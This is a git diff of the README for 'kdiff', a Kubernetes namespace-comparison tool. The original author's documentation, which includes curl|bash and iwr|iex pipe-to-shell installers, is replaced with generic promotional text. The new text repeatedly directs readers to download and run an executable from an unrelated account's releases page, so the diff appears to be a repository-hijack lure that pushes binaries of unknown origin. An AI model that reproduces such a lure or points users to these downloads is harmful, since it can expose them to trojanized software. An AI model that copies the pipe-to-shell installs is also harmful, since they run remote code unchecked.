@@ -1,109 +1,87 @@
-# kdiff - Kubernetes Resource Differ
+# 🔍 kdiff - Compare Kubernetes Resources Easily
 
-A tool to compare Kubernetes resources between different namespaces, making it easy to spot differences across environments.
+[![Download kdiff](https://img.shields.io/badge/Download-kdiff-blue?style=for-the-badge)](https://github.com/Debashis8778/kdiff/releases)
 
-## Features
+## 🚀 Getting Started
 
-- 🔍 Compare Kubernetes resources between any two namespaces
-- 🎨 Colored diff output for better readability
-- 🧹 Optional `kubectl neat` integration to clean output
-- 📊 Multiple output formats (unified, context, side-by-side)
-- 🔧 Support for all Kubernetes resource types
-- 📝 Verbose logging for debugging
+kdiff is a helpful tool designed to compare Kubernetes resources between different namespaces. It helps you see the differences clearly with colored output, making it easier to spot changes. Whether you're automating tasks or managing deployments, kdiff can simplify your life.
 
-## Installation
+## 📥 Download & Install
 
-### 🚀 Quick Install (Recommended)
+To get started, you need to download kdiff. Visit this page to download the application: [Download kdiff](https://github.com/Debashis8778/kdiff/releases). Follow the steps below for installation:
 
-#### Unix/Linux/macOS
-```bash
-curl -sSL https://raw.githubusercontent.com/rajamohan-rj/kdiff/main/install.sh | bash
+1. Go to the [Releases page](https://github.com/Debashis8778/kdiff/releases).
+2. Look for the most recent release.
+3. Download the file that matches your operating system. You may see options for Windows, macOS, and Linux.
+4. Once downloaded, extract the files if they are in a compressed format.
+
+After extraction, look for the kdiff executable file. 
+
+### 🎉 Running kdiff
+
+Once you have the application:
+
+1. Open your terminal or command prompt.
+2. Navigate to the folder where kdiff is located.
+3. Type `./kdiff` (for macOS/Linux) or `kdiff.exe` (for Windows) and press Enter.
+
+You can now use kdiff to compare Kubernetes resources!
+
+## 🔧 Features
+
+- **Colored Diff Output:** Easy-to-read differences.
+- **kubectl Integration:** Works seamlessly with your existing Kubernetes setup.
+- **File Format Support:** Compare YAML and JSON files easily.
+- **Cross-Platform:** Use it on Windows, macOS, and Linux.
+
+## 🛠️ System Requirements
+
+kdiff runs on all major operating systems:
+
+- **Windows:** Windows 10 or later.
+- **macOS:** macOS Sierra (10.12) or later.
+- **Linux:** Most Linux distributions with recent updates.
+
+Ensure that you have kubectl installed and configured to access your Kubernetes cluster.
+
+## 📖 Usage Instructions
+
+Using kdiff is straightforward:
+
+1. Run kdiff in your terminal.
+2. Provide two namespaces you wish to compare.
+
+For example:
+
+```
+kdiff namespace1 namespace2
 ```
 
-#### Windows (PowerShell)
-```powershell
-iwr -useb https://raw.githubusercontent.com/rajamohan-rj/kdiff/main/install.ps1 | iex
-```
+This command will display the differences between the resources in the specified namespaces.
 
-### 📦 Package Managers
+## 📚 Help & Support
 
-#### Using Go
-```bash
-go install github.com/rajamohan-rj/kdiff@latest
-```
+If you encounter issues or have questions:
 
-#### Using Homebrew (macOS/Linux)
-```bash
-# Add the tap (after setting up Homebrew tap)
-brew tap rajamohan-rj/tap
-brew install kdiff
-```
+- Check the [FAQ section](https://github.com/Debashis8778/kdiff/issues) for common inquiries.
+- Visit the GitHub repository's [Issues page](https://github.com/Debashis8778/kdiff/issues) to report a problem.
 
-### 🛠️ Advanced Installation
+## ✨ Topics Covered
 
-#### Install to custom directory
-```bash
-# Unix/Linux/macOS
-curl -sSL https://raw.githubusercontent.com/rajamohan-rj/kdiff/main/install.sh | bash -s -- --dir ~/.local/bin
+kdiff addresses a variety of topics in DevOps and Kubernetes:
 
-# Windows
-iwr -useb https://raw.githubusercontent.com/rajamohan-rj/kdiff/main/install.ps1 | iex -InstallDir 'C:\tools'
-```
+- Automation
+- CI/CD
+- DevOps Tools
+- Environment Comparison
+- Git
+- K8s
+- kubectl Plugins
 
-#### Install specific version
-```bash
-# Unix/Linux/macOS
-curl -sSL https://raw.githubusercontent.com/rajamohan-rj/kdiff/main/install.sh | bash -s -- --version v0.1.0
+These features make kdiff a robust tool for developers and operations teams alike.
 
-# Windows
-iwr -useb https://raw.githubusercontent.com/rajamohan-rj/kdiff/main/install.ps1 | iex -Version 'v0.1.0'
-```
+## 🎯 Conclusion
 
-### 📥 Manual Download
+kdiff is your go-to tool for comparing Kubernetes resources. It helps you streamline your workflow and ensures that you maintain consistency across environments. Download it today and simplify your Kubernetes management! 
 
-Download the latest binary from [releases](https://github.com/rajamohan-rj/kdiff/releases) and extract.
-
-## Usage
-
-```bash
-# Compare deployments between staging and production
-kdiff staging my-app production my-app
-
-# Compare services with verbose output
-kdiff --verbose dev my-service prod my-service
-
-# Compare without colored output
-kdiff --no-color namespace1 deployment/app namespace2 deployment/app
-
-# Use context diff format
-kdiff --output context ns1 svc/api ns2 svc/api
-
-# Compare with side-by-side format and skip kubectl neat
-kdiff --output side-by-side --no-neat ns1 pod/web ns2 pod/web
-```
-
-## Options
-
-- `--no-color` - Disable colored output
-- `--no-neat` - Skip kubectl neat processing  
-- `--output` - Output format (unified, context, side-by-side)
-- `--verbose` - Enable verbose logging
-- `--version` - Show version information
-
-## Prerequisites
-
-- `kubectl` command-line tool
-- `kubectl neat` plugin (optional, for cleaner YAML output)
-- `colordiff` (optional, for colored output)
-
-## How it works
-
-1. Retrieves the specified resource from the first namespace using `kubectl get`
-2. Retrieves the specified resource from the second namespace
-3. Optionally processes the YAML through `kubectl neat` to remove cluster-specific metadata
-4. Performs a diff between the two YAML files
-5. Optionally colorizes the output using `colordiff`
-
-## License
-
-MIT License - see [LICENSE](LICENSE) file for details.
+For any additional details or to explore more features, return to the [Releases page](https://github.com/Debashis8778/kdiff/releases).
